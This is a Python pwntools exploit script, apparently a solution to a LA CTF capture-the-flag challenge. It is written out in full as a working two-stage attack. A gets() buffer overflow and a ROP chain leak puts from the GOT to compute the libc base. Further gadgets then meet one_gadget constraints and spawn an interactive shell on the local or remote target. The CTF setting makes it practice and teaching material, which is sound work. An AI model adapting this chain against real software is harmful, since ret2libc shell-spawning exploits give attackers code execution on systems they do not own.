
from pwn import *

# Challenge information
NAME = 'chall/chall'
PORT = 31137
URL = 'chall.lac.tf'
FLAGFILE = 'chall/flag.txt'


# TMUX/Pwntools configuration

TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']

exe = ELF(NAME)
context.binary = exe
LIBC = ELF('chall/libc.so.6')
LD = ELF('chall/ld-linux-x86-64.so.2')
ENV = {"LD_PRELOAD": LIBC.path}
context.terminal = TERMINAL_CONFIG
context.log_level = 'info'

GDB_COMMAND = '''
break main
set $endofmain = 0x000401382
break *$endofmain
continue
'''

 # Enables printing of all traffic
if args['LOG']:
    context.log_level = 'debug'



def create_flag(flag_path):
    write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')

# Create target process or connect to remote
if args['REMOTE']:
    log.warning('This challenge requires that you start the remote instance.\n'
                'Ensure that the domain and port used in this script with '
                'the remote instance')
    p = remote(URL, PORT)
elif args['GDB']:
    create_flag(FLAGFILE)
    # p = gdb.debug([LD.path, context.binary.path], gdbscript=GDB_COMMAND, env=ENV)
    p = gdb.debug(context.binary.path, gdbscript=GDB_COMMAND, env=ENV)
else:
    create_flag(FLAGFILE)
    p = process([LD.path, context.binary.path], env=ENV)


input("Press enter to start exploit")

# Actual exploit 

## Navigate to 'gets' overflow

## Send 1 to select multiplayer
p.recvuntil(b"2. Multiplayer")
p.sendline(b"1")

## Receive "Enter World Name:"
p.recvuntil(b"Enter world name:")

# 1. Build and send first payload -----------------------------------------------
# Structure: | padding | rbp | nop | read_int | puts |
print("Building payload 1...")
payload = b""

## P1.1: Padding (64 bytes)
padding_bytes = b'A' * 64
payload += padding_bytes

## P1.2: New rbp must be writable, e.g. bss
rbp_addr = 0x404e00
rbp_bytes = p64(rbp_addr)
payload += rbp_bytes

## P1.3: nop gadget, to 16 byte align stack pointer before read_int call
nop_addr = 0x4010ef
nop_bytes = p64(nop_addr)
payload += nop_bytes

## P1.4 call read_int to read puts address into eax 
read_int_addr = exe.sym.read_int
read_int_bytes = p64(read_int_addr)
payload += read_int_bytes

## P1.5 call offset into main just before puts to leak libc address and read second payload 
main_puts_addr = 0x401243
main_puts_bytes = p64(main_puts_addr)
payload += main_puts_bytes

print("Payload 1 bytes: ", payload)
print("Payload 1 length: ", len(payload))

## Send first payload
print("Sending first payload...")
p.sendline(payload)

## Navigate to return
print("Navigating to return...")

p.recvuntil(b"2. Creative")
p.sendline(b"1")

p.recvuntil(b"2. Exit")

print("Ret into the payload...")
p.sendline(b"2")

# 2. Interact with first payload to leak libc address ---------------------------------------------

## Respond to read_int with GOT pointer to puts
print("Sending GOT address to leak puts...")
got_puts = exe.got.puts
got_puts_str = str(got_puts)
p.sendline(bytes(got_puts_str, 'utf-8'))

## Send a line for some reason??
p.recvline()

## Receive libc puts leak, ending with newline
leak_bytes = p.recvline()
putc_leak = int.from_bytes(leak_bytes[:-1], 'little')
print("Leaked puts address (in libc): ", hex(putc_leak))

# 3. Calculate libc base and build second payload ---------------------------------------------
# Structure: | padding | rbp | pop_rbp_r13 | writable addr (rbp) | NULL (r13) | pop_rdi | NULL (rdi) | one_gadget |
print("Building payload 2...")


# Calculate a bunch of gadgets from libc
libc_base = putc_leak - LIBC.sym.puts
print("Libc base: ", hex(libc_base))
pop_rbp_r13_offset = 0x00fea7c
pop_rbp_r13_addr = libc_base + pop_rbp_r13_offset
print("pop_rbp_r13_addr: ", hex(pop_rbp_r13_addr))

pop_rdi_offset = 0x277e5
pop_rdi_addr = libc_base + pop_rdi_offset
print("pop_rdi_addr: ", hex(pop_rdi_addr))

one_gadget_offset = 0xd511f
one_gadget_addr = libc_base + one_gadget_offset
print("one_gadget_addr: ", hex(one_gadget_addr))


payload = b""
padding = b'A' * 64
payload += padding

## Will not be used, doesn't matter
saved_rbp = p64(0xdeadbeef)
payload += saved_rbp

# Uses gadgets to meet one_gadget requirements

## First gadget sets rbp and r13
pop_rbp_r13_gadget = p64(pop_rbp_r13_addr)
payload += pop_rbp_r13_gadget

## For RBP, add writeable address (offset a bit forward)
writeable_addr = p64(0x404e00+0x100)
payload += writeable_addr

## For R13 set NULL
null_bytes = p64(0)
payload += null_bytes

## Second gadget sets rdi
pop_rdi_gadget = p64(pop_rdi_addr)
payload += pop_rdi_gadget

## For RDI set NULL
payload += null_bytes

## Finally, one_gadget
one_gadget = p64(one_gadget_addr)
payload += one_gadget
print("Payload 2 bytes: ", payload)
print("Payload 2 length: ", len(payload))

## Newline in payload will break gets() call, so warn if found
if b'\n' in payload:
    print("Payload contains newline at index: ", payload.index(b'\n'))
    print("Payload: ", payload)
    input("Press enter to try anyways...")
    # exit(1)

## 5. Send second payload and open shell ---------------------------------------------
print("Sending second payload...")
p.sendline(payload)

# Navigate to return
p.recvuntil(b"2. Creative")
p.sendline(b"1")

p.recvuntil(b"2. Exit")
p.sendline(b"2")

print("Opening shell...")
p.interactive()